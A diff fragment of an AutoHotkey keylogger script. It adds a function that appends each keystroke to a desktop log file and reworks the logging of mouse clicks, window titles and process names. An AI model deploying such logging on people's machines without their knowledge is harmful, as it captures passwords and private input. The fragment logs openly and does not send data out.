@@ -5,12 +5,22 @@
 #NoEnv ; Recommended for performance and compatibility with future AutoHotkey releases.
 log = %A_Desktop%\keylogger.txt
 
+keyevent(key) {
+    global
+    FileAppend, %key%, *%log%
+    previousnewline = 0
+}
+
 mouseevent(message) {
     global 
-    MouseGetPos, x, y, window, controln
     WinGetActiveTitle, Title
     WinGet, ProcessName, ProcessName, A
-    FileAppend, `n{%message%} %x% %y% %ProcessName%: %Title%`n, *%log%
+    MouseGetPos, x, y, window, controln
+
+    if (%previousnewline% == 0)
+        FileAppend, `n, *%log%
+    FileAppend, {%message%} %x% %y% %ProcessName%: %Title%`n, *%log%
+    previousnewline = 1
 }
 
 getwin() {
@@ -18,7 +28,11 @@ getwin() {
     WinGetActiveTitle, Title
     WinGet, ProcessName, ProcessName, A
     FormatTime, time, , yyyy-MM-dd-HH:mm:ss
-    FileAppend, `n%time% %ProcessName%: %Title%`n, *%log%
+
+    if (%previousnewline% == 0)
+        FileAppend, `n, *%log%
+    FileAppend, %time% %ProcessName%: %Title%`n, *%log%
+    previousnewline = 1
 }
 
 getwin()
